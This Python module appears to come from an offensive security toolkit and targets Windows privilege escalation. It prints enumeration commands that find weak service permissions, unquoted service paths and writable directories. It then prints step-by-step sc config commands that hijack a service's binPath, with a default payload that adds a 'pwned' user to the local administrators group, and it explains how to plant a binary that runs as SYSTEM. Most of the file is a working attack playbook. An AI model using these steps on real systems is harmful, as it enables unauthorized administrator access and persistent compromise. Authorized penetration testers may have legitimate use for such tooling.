"""Weak service permissions abuse — modifiable services, unquoted paths, DLL hijack."""
from __future__ import annotations
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.privesc.service_abuse.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["service_modification", "privilege_escalation"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1574.010", "T1574.001"],
}

CHECKS = [
    ("modifiable_services", 'accesschk.exe -uwcqv "Everyone" * /accepteula'),
    ("unquoted_paths", 'wmic service get name,pathname,startmode | findstr /i /v "C:\\Windows"'),
    ("writable_service_dirs", 'icacls "C:\\Program Files" /T /C /Q 2>nul | findstr /i "(F)" | findstr /i "BUILTIN\\Users Everyone"'),
    ("dll_hijack_search", 'procmon.exe or PowerUp Find-DLLHijack'),
    ("registry_permissions", 'accesschk.exe -kvuqsw hklm\\System\\CurrentControlSet\\Services /accepteula'),
]


def run(args: Any) -> int:
    action = getattr(args, "service_action", "enumerate")
    service_name = getattr(args, "service_name", None)
    command = getattr(args, "command", "cmd /c net localgroup administrators pwned /add")

    if action == "enumerate":
        print("[*] Service abuse enumeration commands:")
        for name, cmd in CHECKS:
            print("\n  [{}]".format(name))
            print("  {}".format(cmd))
        return 0

    if action == "exploit" and service_name:
        print("[*] Exploiting service: {}".format(service_name))
        print("  1. sc qc {}".format(service_name))
        print("  2. sc config {} binPath=\"{}\"".format(service_name, command))
        print("  3. sc stop {}".format(service_name))
        print("  4. sc start {}".format(service_name))
        print("  5. (restore original binPath)")
        return 0

    if action == "unquoted":
        print("[*] Unquoted service path exploitation:")
        print("  1. Find service with unquoted path containing spaces")
        print('     Example: C:\\Program Files\\My App\\service.exe')
        print("  2. Place payload at earlier path component:")
        print('     C:\\Program.exe')
        print('     C:\\Program Files\\My.exe')
        print("  3. Restart service — payload runs as SYSTEM")
        return 0

    print("[*] Use --service-action enumerate/exploit/unquoted")
    return 0
